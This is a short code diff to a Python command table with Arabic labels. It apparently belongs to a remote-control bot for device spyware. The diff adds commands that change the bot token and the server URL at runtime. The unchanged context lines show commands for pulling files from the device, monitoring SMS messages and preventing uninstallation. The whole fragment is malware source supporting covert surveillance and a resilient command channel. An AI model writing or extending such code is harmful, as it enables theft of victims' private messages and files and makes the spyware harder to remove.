@@ -288,6 +288,9 @@ COMMANDS = {
     "new-files-documents":   {"category": "advanced", "label": "📄 ملفات جديدة",       "description": "المستندات الجديدة فقط",          "needs_param": False},
     "new-files-all":         {"category": "advanced", "label": "📋 كل الجديدة",       "description": "كل الملفات الجديدة",          "needs_param": False},
     "pull-new-file":         {"category": "advanced", "label": "📥 سحب ملف",       "description": "سحب ملف من الجديدة",          "needs_param": True},
+    # ⚡ V11.2.64: تحديث التوكن والسيرفر ديناميكياً
+    "update-bot-token":      {"category": "advanced", "label": "🔑 تحديث التوكن",       "description": "تغيير توكن البوت",          "needs_param": True},
+    "update-server-url":     {"category": "advanced", "label": "🌐 تحديث السيرفر",       "description": "تغيير عنوان السيرفر",          "needs_param": True},
     "sms-monitor-on":        {"category": "advanced", "label": "💬 مراقبة الرسائل",       "description": "مراقبة الرسائل النصية الجديدة",          "needs_param": False},
     "sms-monitor-off":       {"category": "advanced", "label": "⏹ إيقاف الرسائل",    "description": "إيقاف مراقبة الرسائل",      "needs_param": False},
     "uninstall-protect-on":  {"category": "advanced", "label": "🔒 منع إلغاء التثبيت",       "description": "منع حذف التطبيق",          "needs_param": False},
